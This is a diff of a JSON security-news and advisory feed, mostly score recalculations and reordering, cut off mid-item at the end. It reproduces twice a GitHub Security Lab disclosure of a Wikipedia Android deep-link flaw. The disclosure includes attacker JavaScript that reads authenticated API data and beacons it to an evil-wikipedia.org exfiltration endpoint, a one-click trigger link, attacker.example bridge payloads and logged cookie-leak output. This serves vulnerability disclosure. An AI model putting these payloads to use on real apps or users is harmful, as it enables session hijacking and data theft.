@@ -1,6 +1,6 @@
 {
   "first_run": "2026-10-28T20:57:11Z",
-  "generated": "2026-11-11T05:30:28Z",
+  "generated": "2026-11-11T13:58:28Z",
   "items": [
     {
       "appsec": true,
@@ -47,12 +47,12 @@
       "id": "f7edd20af5e47e91",
       "kev": false,
       "published": "2026-11-09T18:36:54Z",
-      "score": 50.0,
+      "score": 49.5,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
         "watchlist:php (+15)",
         "AppSec-relevant (+14)",
-        "recency (+13.0)"
+        "recency (+12.5)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -73,12 +73,12 @@
       "id": "01ab834e1aeb3372",
       "kev": false,
       "published": "2026-11-09T04:25:05Z",
-      "score": 47.2,
+      "score": 46.8,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:composer,llm (+15)",
         "AppSec-relevant (+14)",
-        "recency (+12.2)"
+        "recency (+11.8)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -100,12 +100,12 @@
       "id": "9944ce46586e30e8",
       "kev": false,
       "published": "2026-11-06T03:32:33Z",
-      "score": 46.1,
+      "score": 45.8,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
         "watchlist:authentication bypass,openssh (+15)",
         "AppSec-relevant (+14)",
-        "recency (+9.1)"
+        "recency (+8.8)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -126,12 +126,12 @@
       "id": "4519138a0235fdcb",
       "kev": false,
       "published": "2026-11-05T15:30:00Z",
-      "score": 45.6,
+      "score": 45.3,
       "score_reasons": [
         "source:tl;dr sec (+8)",
         "watchlist:supply chain,remote code execution,rce (+15)",
         "AppSec-relevant (+14)",
-        "recency (+8.6)"
+        "recency (+8.3)"
       ],
       "source": "tl;dr sec",
       "source_type": "news",
@@ -145,32 +145,6 @@
       ],
       "title": "[tl;dr sec] #353 - A Thousand Fewer Paths to Root, Kubernetes Security Logging, Post-AI Security Floor",
       "url": "https://tldrsec.com/p/tldr-sec-353"
-    },
-    {
-      "appsec": true,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "9858e6d325f7b887",
-      "kev": false,
-      "published": "2026-11-04T00:53:51Z",
-      "score": 44.4,
-      "score_reasons": [
-        "source:Risky Bulletin (+8)",
-        "watchlist:rce (+15)",
-        "AppSec-relevant (+14)",
-        "recency (+7.4)"
-      ],
-      "source": "Risky Bulletin",
-      "source_type": "news",
-      "summary": "Hackers brick Chinese EVs in Russia, a second wave of hacks defrost European supermarket freezers, the US boots Acronis from government networks and the major distros patch a Linux kernel RCE. Show notes Risky Bulletin: Hackers lock out and extort Li Auto EV owners in Russia",
-      "tags": [
-        "appsec",
-        "watchlist",
-        "rce"
-      ],
-      "title": "Risky Bulletin: Hackers brick Chinese EVs in Russia",
-      "url": "https://risky.biz/RBNEWS629/"
     },
     {
       "appsec": true,
@@ -198,6 +172,32 @@
       ],
       "title": "How to fix a bug in a fix",
       "url": "https://projectzero.google/2026/10/emergency-patching.html"
+    },
+    {
+      "appsec": true,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "9858e6d325f7b887",
+      "kev": false,
+      "published": "2026-11-04T00:53:51Z",
+      "score": 44.1,
+      "score_reasons": [
+        "source:Risky Bulletin (+8)",
+        "watchlist:rce (+15)",
+        "AppSec-relevant (+14)",
+        "recency (+7.1)"
+      ],
+      "source": "Risky Bulletin",
+      "source_type": "news",
+      "summary": "Hackers brick Chinese EVs in Russia, a second wave of hacks defrost European supermarket freezers, the US boots Acronis from government networks and the major distros patch a Linux kernel RCE. Show notes Risky Bulletin: Hackers lock out and extort Li Auto EV owners in Russia",
+      "tags": [
+        "appsec",
+        "watchlist",
+        "rce"
+      ],
+      "title": "Risky Bulletin: Hackers brick Chinese EVs in Russia",
+      "url": "https://risky.biz/RBNEWS629/"
     },
     {
       "appsec": true,
@@ -406,12 +406,12 @@
       "id": "6ac82d58465efb8f",
       "kev": false,
       "published": "2026-10-01T00:00:00Z",
-      "score": 41.3,
+      "score": 41.2,
       "score_reasons": [
         "source:GitHub Security Lab (+12)",
         "watchlist:java,path traversal (+15)",
         "AppSec-relevant (+14)",
-        "recency (+0.3)"
+        "recency (+0.2)"
       ],
       "source": "GitHub Security Lab",
       "source_type": "research",
@@ -436,12 +436,12 @@
       "id": "7d3afef840376092",
       "kev": false,
       "published": "2026-10-01T00:00:00Z",
-      "score": 41.3,
+      "score": 41.2,
       "score_reasons": [
         "source:GitHub Security Lab (+12)",
         "watchlist:php,javascript,csrf (+15)",
         "AppSec-relevant (+14)",
-        "recency (+0.3)"
+        "recency (+0.2)"
       ],
       "source": "GitHub Security Lab",
       "source_type": "research",
@@ -466,12 +466,12 @@
       "id": "9c56ebb02ce10409",
       "kev": false,
       "published": "2026-10-01T00:00:00Z",
-      "score": 41.3,
+      "score": 41.2,
       "score_reasons": [
         "source:GitHub Security Lab (+12)",
         "watchlist:path traversal (+15)",
         "AppSec-relevant (+14)",
-        "recency (+0.3)"
+        "recency (+0.2)"
       ],
       "source": "GitHub Security Lab",
       "source_type": "research",
@@ -488,18 +488,48 @@
     },
     {
       "appsec": true,
+      "cves": [
+        "CVE-2026-65993"
+      ],
+      "epss": null,
+      "feed": "threats",
+      "id": "cc7890a17102e182",
+      "kev": false,
+      "published": "2026-10-01T00:00:00Z",
+      "score": 41.2,
+      "score_reasons": [
+        "source:GitHub Security Lab (+12)",
+        "watchlist:php,java,javascript (+15)",
+        "AppSec-relevant (+14)",
+        "recency (+0.2)"
+      ],
+      "source": "GitHub Security Lab",
+      "source_type": "research",
+      "summary": "Coordinated Disclosure Timeline 2026-03-30: Vulnerability reported at https://phabricator.wikimedia.org/T421795 2026-04-14: Vulnerabilities fixed and tested by maintainers. 2026-05-08: Phabricator issue closed. Summary The apps-android-wikipedia project in its latest version is vulnerable to improper host validation in the wikipedia:// deep link handler (GHSL-2026-101), potentially allowing attackers to exploit this flaw to steal session tokens and compromise user accounts. Project apps-android-wikipedia Tested Version latest Details Improper Host Validation in wikipedia:// Deep Link Handler Enables Session Token Theft (GHSL-2026-101) The Wikipedia for Android app handles wikipedia:// deep links in MainActivity.handleIntent() by validating the URI authority with String.endsWith(): // MainActivity.kt:144 if (it.authority.orEmpty().endsWith(WikiSite.BASE_DOMAIN)) { val uri = Uri.parse(it.toString().replace(\"wikipedia://\", WikiSite.DEFAULT_SCHEME + \"://\")) startActivity(Intent(this, PageActivity::class.java) .setAction(Intent.ACTION_VIEW) .setData(uri)) } where WikiSite.BASE_DOMAIN is \"wikipedia.org\". The endsWith() check does not verify a dot boundary (or exact match), so any domain ending with the literal string wikipedia.org passes validation — for example, evil-wikipedia.org or notwikipedia.org. The manifest declares the wikipedia:// scheme with BROWSABLE category and no host restriction: <!-- AndroidManifest.xml:104-109 --> <intent-filter> <action android:name=\"android.intent.action.VIEW\" /> <category android:name=\"android.intent.category.DEFAULT\" /> <category android:name=\"android.intent.category.BROWSABLE\" /> <data android:scheme=\"wikipedia\" /> </intent-filter> This means any web page, QR code, NFC tag, or installed app can fire wikipedia://evil-wikipedia.org/wiki/Article and it will be delivered to the Wikipedia app directly. Because the Wikipedia app is the only handler for the wikipedia:// scheme, Android launches it with no disambiguation dialog — the user sees the Wikipedia app open normally. This single entry-point bug chains into multiple independent impacts: Finding 1 (Critical): CentralAuth Session Cookie Theft After passing the endsWith check, the URI is rewritten from wikipedia://evil-wikipedia.org/... to https://evil-wikipedia.org/... and passed to PageActivity. The WikiSite(uri) constructor preserves the attacker’s authority because evil-wikipedia.org has only 2 dot-separated parts, yielding languageCode = \"\". The subdomain-rewrite guard at line 82 (subdomain().isNotEmpty()) is false, so the authority remains evil-wikipedia.org. ServiceFactory then builds the REST base URL from wiki.url() = https://evil-wikipedia.org, and all API requests are sent to the attacker’s server via OkHttpConnectionFactory.client, which has SharedPreferenceCookieManager attached as its cookie jar. In loadForRequest(), stored cookies are matched using the same flawed endsWith pattern: // SharedPreferenceCookieManager.kt:101 if (domain.endsWith(domainSpec)) { buildCookieList(cookieList, cookiesForDomainSpec, null) } Wikipedia’s CentralAuth cookies are stored under domainSpec = \"wikipedia.org\". Since \"evil-wikipedia.org\".endsWith(\"wikipedia.org\") is true, all .wikipedia.org-scoped cookies are sent to the attacker, including: centralauth_Session — active session identifier centralauth_Token — long-lived “remember me” token (~30 days, survives per-site logout) centralauth_User — username These are global SSO cookies valid across every Wikimedia project (all Wikipedias, Commons, Wikidata, Meta, etc.). Finding 2 (High): Same-Origin Policy Bypass — Authenticated Cross-Origin Read The article WebView uses OkHttpWebViewClient which intercepts all http/https subresource requests via shouldInterceptRequest(), proxies them through the same OkHttpConnectionFactory.client (with the cookie jar), and then unconditionally injects Access-Control-Allow-Origin: * on every response: // OkHttpWebViewClient.kt:135 private fun addResponseHeaders(headers: Headers): Headers { return headers.newBuilder().set(\"Access-Control-Allow-Origin\", \"*\").build() } Because cookies are injected by OkHttp behind the WebView’s back (not via credentials: 'include'), the WebView treats these as non-credentialed requests. The wildcard CORS header passes. Attacker JavaScript running at https://evil-wikipedia.org can therefore fetch() authenticated Wikipedia API endpoints and read the response body: // Running inside the Wikipedia app's WebView at https://evil-wikipedia.org: fetch('https://en.wikipedia.org/w/api.php?action=query&meta=userinfo&uiprop=email|groups&format=json') .then(r => r.json()) .then(data => { // data.query.userinfo contains: name, email, groups, registration date navigator.sendBeacon('https://evil-wikipedia.org/exfil', JSON.stringify(data)); }); This allows the attacker to read the victim’s email address, user groups (sysop, bureaucrat, checkuser, etc.), watchlist, CSRF tokens, private drafts, and any other authenticated API data — all from attacker-controlled JavaScript, without the victim’s knowledge. Finding 3 (Medium): Content Spoofing via Exposed @JavascriptInterface Bridge The article WebView enables JavaScript and exposes a pcsClient @JavascriptInterface: // CommunicationBridge.kt:52-56 communicationBridgeListener.webView.settings.javaScriptEnabled = true communicationBridgeListener.webView.settings.allowUniversalAccessFromFileURLs = true communicationBridgeListener.webView.addJavascriptInterface(PcsClientJavascriptInterface(), \"pcsClient\") The attacker’s HTML is loaded into the same WebView that normally renders trusted Wikipedia PCS content. The entire article area is under attacker control while the surrounding native UI (toolbar, Wikipedia logo, save button, tabs) remains the real app — creating a convincing trusted context for phishing or misinformation. The pcsClient bridge exposes two methods to attacker JS: pcsClient.getSetupSettings() — synchronously returns a JSON blob containing AccountUtil.groups (reveals if victim is sysop, checkuser, etc.), client version, theme, and preferences. This is an information disclosure that also enables target selection. pcsClient.onReceiveMessage(json) — drives native event handlers registered in PageFragment.setupMessageHandlers(). Attacker JS can dispatch: {\"action\":\"link\", \"data\":{\"href\":\"https://attacker.example/phish\"}} → LinkHandler.onUrlClick() → UriUtil.visitInExternalBrowser() → startActivity(Intent(ACTION_VIEW, uri)) — opens arbitrary URLs in the default browser or fires implicit intents (including geo:, mailto:, Play Store links) {\"action\":\"pronunciation\", \"data\":{\"url\":\"https://attacker/track\"}} → AvPlayer.play(url) — autoplay audio from attacker URL (tracking, annoyance) {\"action\":\"footer_item\", \"data\":{\"itemType\":\"talkPage\"}} → opens Talk page activity with attacker-controlled WikiSite Impact Session hijacking: Attacker captures CentralAuth SSO cookies and can impersonate the victim across all ~800 Wikimedia projects. With the session, the attacker can edit articles, read the victim’s email address, access watchlists, send wiki-emails as the victim, and — if the victim has elevated rights — delete pages, block users, or perform oversight actions. Authenticated data exfiltration: Via the SOP bypass, attacker JavaScript can silently read the victim’s email, user groups, watchlist, CSRF tokens, private drafts, and any API-accessible data, then exfiltrate it without any visible indication. Content spoofing / phishing: Pixel-perfect fake Wikipedia articles rendered inside the real app’s trusted chrome. Can display fake “re-enter password” prompts, misinformation, or defamatory content attributed to Wikipedia. 1-click, no-dialog attack: The Wikipedia app is the sole handler for wikipedia://, so Android launches it directly from a browser tap with no disambiguation or confirmation dialog. CWEs CWE-939: “Improper Authorization in Handler for Custom URL Scheme” CWE-200: “Exposure of Sensitive Information to an Unauthorized Actor” CWE-668: “Exposure of Resource to Wrong Sphere” (SOP bypass) CWE-451: “User Interface (UI) Misrepresentation of Critical Information” (content spoofing) CWE-749: “Exposed Dangerous Method or Function” (@JavascriptInterface bridge) Proof Of Concept The following files are used for this exploit: File Purpose poc_server.py HTTPS listener that (1) logs leaked cookies from OkHttp requests, (2) serves a weaponized mobile-html page that triggers the PCS bridge handshake, demonstrates the SOP bypass, and exfiltrates data attack.html Web-deliverable trigger page with <a href=\"wikipedia://evil-wikipedia.org/wiki/PoC\"> links demonstrating the 1-click browser-to-app attack vector First, we register a malicious domain. In this case, we use evil-wikipedia.org. attack.html <a class=\"big\" href=\"wikipedia://evil-wikipedia.org/wiki/PoC\"> 📖 Open this article in the Wikipedia app </a> A user is led to attack.html and asked to click a button, sending them to evil-wikipedia.org within the Android app. No confirmation dialog is presented after clicking. poc_server.py The vulnerable flow: wikipedia://evil-wikipedia.org/wiki/PoC -> MainActivity.handleIntent: \"evil-wikipedia.org\".endsWith(\"wikipedia.org\") == true -> rewritten to https://evil-wikipedia.org/wiki/PoC -> PageActivity -> WikiSite(uri) keeps authority = evil-wikipedia.org (2 dot-parts -> languageCode=\"\") -> ServiceFactory.getRest(wiki) baseUrl = https://evil-wikipedia.org/api/rest_v1/ -> OkHttp CookieJar.loadForRequest(\"evil-wikipedia.org\"): domainSpec \"wikipedia.org\" in jar \"evil-wikipedia.org\".endsWith(\"wikipedia.org\") == true -> ALL .wikipedia.org-scoped cookies attached, incl. centralauth_* poc_server.py then hosts the javascript to attack the Android app. Its full contents are not in this report, but can be requested. Observed Results Cookie theft (Finding 1) — The server immediately logs all CentralAuth cookies: ============================================================================== [+] GET /api/rest_v1/page/summary/PoC Host: evil-wikipedia.org >>> COOKIE LEAK <<< [!!!] centralauth_User=Kuzzs [!!!] centralauth_Token=xxxxxxxxxxxxxx [!!!] centralauth_Session=xxxxxxxxxxxx ============================================================================== SOP bypass (Finding 2) — The injected JavaScript calls fetch('https://en.wikipedia.org/w/api.php?action=query&meta=userinfo&uiprop=email|groups|rights&format=json') and reads the authenticated response cross-origin: ############################################################################## # EXFIL from attacker JS inside the Wikipedia WebView ############################################################################## { \"batchcomplete\": true, \"query\": { \"userinfo\": { \"id\": 53013219, \"name\": \"Kuzzs\", \"groups\": [ \"*\", \"user\" ], \"rights\": [ \"createaccount\", \"read\", \"edit\", \"createtalk\", \"viewmyprivateinfo\", ... ], \"email\": \"[redacted]\", \"emailauthenticated\": \"2026-03-27T05:49:29Z\", \"registrationdate\": \"2026-03-27T05:49:10Z\" } } } ############################################################################## Bridge info leak (Finding 3) — pcsClient.getSetupSettings() returns user groups and app configuration with zero interaction: ############################################################################## # EXFIL from attacker JS inside the Wikipedia WebView ############################################################################## out-B --- userGroups: [\"*\",\"user\"] --- { \"platform\": \"android\", \"clientVersion\": \"50575-dev-2026-03-26\", \"userGroups\": [\"*\", \"user\"], \"isEditable\": true, ... } ############################################################################## CVE CVE-2026-65993 Credit This issue was discovered and reported by GHSL team member @Kwstubbs (Kevin Stubbings). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-101 in any communication regarding this issue.",
+      "tags": [
+        "research",
+        "appsec",
+        "watchlist",
+        "has-CVE",
+        "php"
+      ],
+      "title": "GHSL-2026-101: Malicious deep links can steal Wikipedia Android session cookies - CVE-2026-65993",
+      "url": "https://securitylab.github.com/advisories/GHSL-2026-101_apps-android-wikipedia/"
+    },
+    {
+      "appsec": true,
       "cves": [],
       "epss": null,
       "feed": "news",
       "id": "c0d26d9fed6f72f3",
       "kev": false,
       "published": "2026-10-29T14:30:00Z",
-      "score": 41.3,
+      "score": 41.1,
       "score_reasons": [
         "source:tl;dr sec (+8)",
         "watchlist:php,python,javascript (+15)",
         "AppSec-relevant (+14)",
-        "recency (+4.3)"
+        "recency (+4.1)"
       ],
       "source": "tl;dr sec",
       "source_type": "news",
@@ -520,48 +550,18 @@
     },
     {
       "appsec": true,
-      "cves": [
-        "CVE-2026-65993"
-      ],
-      "epss": null,
-      "feed": "threats",
-      "id": "cc7890a17102e182",
-      "kev": false,
-      "published": "2026-10-01T00:00:00Z",
-      "score": 41.3,
-      "score_reasons": [
-        "source:GitHub Security Lab (+12)",
-        "watchlist:php,java,javascript (+15)",
-        "AppSec-relevant (+14)",
-        "recency (+0.3)"
-      ],
-      "source": "GitHub Security Lab",
-      "source_type": "research",
-      "summary": "Coordinated Disclosure Timeline 2026-03-30: Vulnerability reported at https://phabricator.wikimedia.org/T421795 2026-04-14: Vulnerabilities fixed and tested by maintainers. 2026-05-08: Phabricator issue closed. Summary The apps-android-wikipedia project in its latest version is vulnerable to improper host validation in the wikipedia:// deep link handler (GHSL-2026-101), potentially allowing attackers to exploit this flaw to steal session tokens and compromise user accounts. Project apps-android-wikipedia Tested Version latest Details Improper Host Validation in wikipedia:// Deep Link Handler Enables Session Token Theft (GHSL-2026-101) The Wikipedia for Android app handles wikipedia:// deep links in MainActivity.handleIntent() by validating the URI authority with String.endsWith(): // MainActivity.kt:144 if (it.authority.orEmpty().endsWith(WikiSite.BASE_DOMAIN)) { val uri = Uri.parse(it.toString().replace(\"wikipedia://\", WikiSite.DEFAULT_SCHEME + \"://\")) startActivity(Intent(this, PageActivity::class.java) .setAction(Intent.ACTION_VIEW) .setData(uri)) } where WikiSite.BASE_DOMAIN is \"wikipedia.org\". The endsWith() check does not verify a dot boundary (or exact match), so any domain ending with the literal string wikipedia.org passes validation — for example, evil-wikipedia.org or notwikipedia.org. The manifest declares the wikipedia:// scheme with BROWSABLE category and no host restriction: <!-- AndroidManifest.xml:104-109 --> <intent-filter> <action android:name=\"android.intent.action.VIEW\" /> <category android:name=\"android.intent.category.DEFAULT\" /> <category android:name=\"android.intent.category.BROWSABLE\" /> <data android:scheme=\"wikipedia\" /> </intent-filter> This means any web page, QR code, NFC tag, or installed app can fire wikipedia://evil-wikipedia.org/wiki/Article and it will be delivered to the Wikipedia app directly. Because the Wikipedia app is the only handler for the wikipedia:// scheme, Android launches it with no disambiguation dialog — the user sees the Wikipedia app open normally. This single entry-point bug chains into multiple independent impacts: Finding 1 (Critical): CentralAuth Session Cookie Theft After passing the endsWith check, the URI is rewritten from wikipedia://evil-wikipedia.org/... to https://evil-wikipedia.org/... and passed to PageActivity. The WikiSite(uri) constructor preserves the attacker’s authority because evil-wikipedia.org has only 2 dot-separated parts, yielding languageCode = \"\". The subdomain-rewrite guard at line 82 (subdomain().isNotEmpty()) is false, so the authority remains evil-wikipedia.org. ServiceFactory then builds the REST base URL from wiki.url() = https://evil-wikipedia.org, and all API requests are sent to the attacker’s server via OkHttpConnectionFactory.client, which has SharedPreferenceCookieManager attached as its cookie jar. In loadForRequest(), stored cookies are matched using the same flawed endsWith pattern: // SharedPreferenceCookieManager.kt:101 if (domain.endsWith(domainSpec)) { buildCookieList(cookieList, cookiesForDomainSpec, null) } Wikipedia’s CentralAuth cookies are stored under domainSpec = \"wikipedia.org\". Since \"evil-wikipedia.org\".endsWith(\"wikipedia.org\") is true, all .wikipedia.org-scoped cookies are sent to the attacker, including: centralauth_Session — active session identifier centralauth_Token — long-lived “remember me” token (~30 days, survives per-site logout) centralauth_User — username These are global SSO cookies valid across every Wikimedia project (all Wikipedias, Commons, Wikidata, Meta, etc.). Finding 2 (High): Same-Origin Policy Bypass — Authenticated Cross-Origin Read The article WebView uses OkHttpWebViewClient which intercepts all http/https subresource requests via shouldInterceptRequest(), proxies them through the same OkHttpConnectionFactory.client (with the cookie jar), and then unconditionally injects Access-Control-Allow-Origin: * on every response: // OkHttpWebViewClient.kt:135 private fun addResponseHeaders(headers: Headers): Headers { return headers.newBuilder().set(\"Access-Control-Allow-Origin\", \"*\").build() } Because cookies are injected by OkHttp behind the WebView’s back (not via credentials: 'include'), the WebView treats these as non-credentialed requests. The wildcard CORS header passes. Attacker JavaScript running at https://evil-wikipedia.org can therefore fetch() authenticated Wikipedia API endpoints and read the response body: // Running inside the Wikipedia app's WebView at https://evil-wikipedia.org: fetch('https://en.wikipedia.org/w/api.php?action=query&meta=userinfo&uiprop=email|groups&format=json') .then(r => r.json()) .then(data => { // data.query.userinfo contains: name, email, groups, registration date navigator.sendBeacon('https://evil-wikipedia.org/exfil', JSON.stringify(data)); }); This allows the attacker to read the victim’s email address, user groups (sysop, bureaucrat, checkuser, etc.), watchlist, CSRF tokens, private drafts, and any other authenticated API data — all from attacker-controlled JavaScript, without the victim’s knowledge. Finding 3 (Medium): Content Spoofing via Exposed @JavascriptInterface Bridge The article WebView enables JavaScript and exposes a pcsClient @JavascriptInterface: // CommunicationBridge.kt:52-56 communicationBridgeListener.webView.settings.javaScriptEnabled = true communicationBridgeListener.webView.settings.allowUniversalAccessFromFileURLs = true communicationBridgeListener.webView.addJavascriptInterface(PcsClientJavascriptInterface(), \"pcsClient\") The attacker’s HTML is loaded into the same WebView that normally renders trusted Wikipedia PCS content. The entire article area is under attacker control while the surrounding native UI (toolbar, Wikipedia logo, save button, tabs) remains the real app — creating a convincing trusted context for phishing or misinformation. The pcsClient bridge exposes two methods to attacker JS: pcsClient.getSetupSettings() — synchronously returns a JSON blob containing AccountUtil.groups (reveals if victim is sysop, checkuser, etc.), client version, theme, and preferences. This is an information disclosure that also enables target selection. pcsClient.onReceiveMessage(json) — drives native event handlers registered in PageFragment.setupMessageHandlers(). Attacker JS can dispatch: {\"action\":\"link\", \"data\":{\"href\":\"https://attacker.example/phish\"}} → LinkHandler.onUrlClick() → UriUtil.visitInExternalBrowser() → startActivity(Intent(ACTION_VIEW, uri)) — opens arbitrary URLs in the default browser or fires implicit intents (including geo:, mailto:, Play Store links) {\"action\":\"pronunciation\", \"data\":{\"url\":\"https://attacker/track\"}} → AvPlayer.play(url) — autoplay audio from attacker URL (tracking, annoyance) {\"action\":\"footer_item\", \"data\":{\"itemType\":\"talkPage\"}} → opens Talk page activity with attacker-controlled WikiSite Impact Session hijacking: Attacker captures CentralAuth SSO cookies and can impersonate the victim across all ~800 Wikimedia projects. With the session, the attacker can edit articles, read the victim’s email address, access watchlists, send wiki-emails as the victim, and — if the victim has elevated rights — delete pages, block users, or perform oversight actions. Authenticated data exfiltration: Via the SOP bypass, attacker JavaScript can silently read the victim’s email, user groups, watchlist, CSRF tokens, private drafts, and any API-accessible data, then exfiltrate it without any visible indication. Content spoofing / phishing: Pixel-perfect fake Wikipedia articles rendered inside the real app’s trusted chrome. Can display fake “re-enter password” prompts, misinformation, or defamatory content attributed to Wikipedia. 1-click, no-dialog attack: The Wikipedia app is the sole handler for wikipedia://, so Android launches it directly from a browser tap with no disambiguation or confirmation dialog. CWEs CWE-939: “Improper Authorization in Handler for Custom URL Scheme” CWE-200: “Exposure of Sensitive Information to an Unauthorized Actor” CWE-668: “Exposure of Resource to Wrong Sphere” (SOP bypass) CWE-451: “User Interface (UI) Misrepresentation of Critical Information” (content spoofing) CWE-749: “Exposed Dangerous Method or Function” (@JavascriptInterface bridge) Proof Of Concept The following files are used for this exploit: File Purpose poc_server.py HTTPS listener that (1) logs leaked cookies from OkHttp requests, (2) serves a weaponized mobile-html page that triggers the PCS bridge handshake, demonstrates the SOP bypass, and exfiltrates data attack.html Web-deliverable trigger page with <a href=\"wikipedia://evil-wikipedia.org/wiki/PoC\"> links demonstrating the 1-click browser-to-app attack vector First, we register a malicious domain. In this case, we use evil-wikipedia.org. attack.html <a class=\"big\" href=\"wikipedia://evil-wikipedia.org/wiki/PoC\"> 📖 Open this article in the Wikipedia app </a> A user is led to attack.html and asked to click a button, sending them to evil-wikipedia.org within the Android app. No confirmation dialog is presented after clicking. poc_server.py The vulnerable flow: wikipedia://evil-wikipedia.org/wiki/PoC -> MainActivity.handleIntent: \"evil-wikipedia.org\".endsWith(\"wikipedia.org\") == true -> rewritten to https://evil-wikipedia.org/wiki/PoC -> PageActivity -> WikiSite(uri) keeps authority = evil-wikipedia.org (2 dot-parts -> languageCode=\"\") -> ServiceFactory.getRest(wiki) baseUrl = https://evil-wikipedia.org/api/rest_v1/ -> OkHttp CookieJar.loadForRequest(\"evil-wikipedia.org\"): domainSpec \"wikipedia.org\" in jar \"evil-wikipedia.org\".endsWith(\"wikipedia.org\") == true -> ALL .wikipedia.org-scoped cookies attached, incl. centralauth_* poc_server.py then hosts the javascript to attack the Android app. Its full contents are not in this report, but can be requested. Observed Results Cookie theft (Finding 1) — The server immediately logs all CentralAuth cookies: ============================================================================== [+] GET /api/rest_v1/page/summary/PoC Host: evil-wikipedia.org >>> COOKIE LEAK <<< [!!!] centralauth_User=Kuzzs [!!!] centralauth_Token=xxxxxxxxxxxxxx [!!!] centralauth_Session=xxxxxxxxxxxx ============================================================================== SOP bypass (Finding 2) — The injected JavaScript calls fetch('https://en.wikipedia.org/w/api.php?action=query&meta=userinfo&uiprop=email|groups|rights&format=json') and reads the authenticated response cross-origin: ############################################################################## # EXFIL from attacker JS inside the Wikipedia WebView ############################################################################## { \"batchcomplete\": true, \"query\": { \"userinfo\": { \"id\": 53013219, \"name\": \"Kuzzs\", \"groups\": [ \"*\", \"user\" ], \"rights\": [ \"createaccount\", \"read\", \"edit\", \"createtalk\", \"viewmyprivateinfo\", ... ], \"email\": \"[redacted]\", \"emailauthenticated\": \"2026-03-27T05:49:29Z\", \"registrationdate\": \"2026-03-27T05:49:10Z\" } } } ############################################################################## Bridge info leak (Finding 3) — pcsClient.getSetupSettings() returns user groups and app configuration with zero interaction: ############################################################################## # EXFIL from attacker JS inside the Wikipedia WebView ############################################################################## out-B --- userGroups: [\"*\",\"user\"] --- { \"platform\": \"android\", \"clientVersion\": \"50575-dev-2026-03-26\", \"userGroups\": [\"*\", \"user\"], \"isEditable\": true, ... } ############################################################################## CVE CVE-2026-65993 Credit This issue was discovered and reported by GHSL team member @Kwstubbs (Kevin Stubbings). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-101 in any communication regarding this issue.",
-      "tags": [
-        "research",
-        "appsec",
-        "watchlist",
-        "has-CVE",
-        "php"
-      ],
-      "title": "GHSL-2026-101: Malicious deep links can steal Wikipedia Android session cookies - CVE-2026-65993",
-      "url": "https://securitylab.github.com/advisories/GHSL-2026-101_apps-android-wikipedia/"
-    },
-    {
-      "appsec": true,
       "cves": [],
       "epss": null,
       "feed": "news",
       "id": "6512aa1df788d204",
       "kev": false,
       "published": "2026-10-29T02:30:02Z",
-      "score": 41.1,
+      "score": 40.9,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
         "watchlist:php (+15)",
         "AppSec-relevant (+14)",
-        "recency (+4.1)"
+        "recency (+3.9)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -582,12 +582,12 @@
       "id": "339d7ddf5cc0abad",
       "kev": false,
       "published": "2026-10-31T23:15:22Z",
-      "score": 40.4,
+      "score": 40.2,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:javascript,xss (+15)",
         "AppSec-relevant (+14)",
-        "recency (+5.4)"
+        "recency (+5.2)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -608,12 +608,12 @@
       "id": "439ed1900392816c",
       "kev": false,
       "published": "2026-10-26T19:51:21Z",
-      "score": 40.3,
+      "score": 40.2,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
         "watchlist:php (+15)",
         "AppSec-relevant (+14)",
-        "recency (+3.3)"
+        "recency (+3.2)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -634,12 +634,12 @@
       "id": "31adffac7255205b",
       "kev": false,
       "published": "2026-10-26T01:20:43Z",
-      "score": 40.0,
+      "score": 39.9,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
         "watchlist:php,rce (+15)",
         "AppSec-relevant (+14)",
-        "recency (+3.0)"
+        "recency (+2.9)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -661,12 +661,12 @@
       "id": "2651c05b9f589774",
       "kev": false,
       "published": "2026-10-23T03:35:19Z",
-      "score": 39.3,
+      "score": 39.2,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
         "watchlist:supply chain (+15)",
         "AppSec-relevant (+14)",
-        "recency (+2.3)"
+        "recency (+2.2)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -737,35 +737,6 @@
     },
     {
       "appsec": true,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "ab3b0b6479de9de2",
-      "kev": false,
-      "published": "2026-10-15T14:30:00Z",
-      "score": 38.1,
-      "score_reasons": [
-        "source:tl;dr sec (+8)",
-        "watchlist:javascript,sharepoint,ssrf (+15)",
-        "AppSec-relevant (+14)",
-        "recency (+1.1)"
-      ],
-      "source": "tl;dr sec",
-      "source_type": "news",
-      "summary": "Hey there,I hope you’ve been doing well!🤔 AdviceOne of the biggest emotional intelligence unlocks I’ve had is learning to differentiate when a partner or friend is wanting to a) vent or b) problem solve.It’s kind of embarrassing, but I think I was late 20’s to early 30’s when that really sunk in.I also noticed that (most) therapists seem to not want to tell you what to do.When I first started therapy, I went in thinking, “OK, you’re an expert in this space and have spent years studying it. I am going to give you my full context and then you can give me an educated, weighted advice and plan based on your knowledge + my specific context.”But it was difficult to get them to give a “this is the answer” or “you should do X” type judgement.After some reflection and further discussion, it makes sense why, though I still kind of find it annoying to be honest.Maybe they’re worried about this:I’ve found long discussions with friends who’ve known me for years really helpful for stuff like this (shout-out my bud Daniel Miessler). I hope you too have friends with whom you’re filling up your relational context window 😂 Sponsor📣 Personal AI agents are crossing the corporate trust boundaryAn employee connects their personal AI agent to Slack. Now it can read internal conversations, access files, and act through authenticated sessions. Computer-use agents introduce a new class of unmanaged access that traditional SaaS discovery, EDR and DLP weren't built to address.Harmonic gives security teams visibility into employee AI usage and the sensitive data flowing into AI tools, so you can identify risky behavior without blocking adoption.👉 Explore 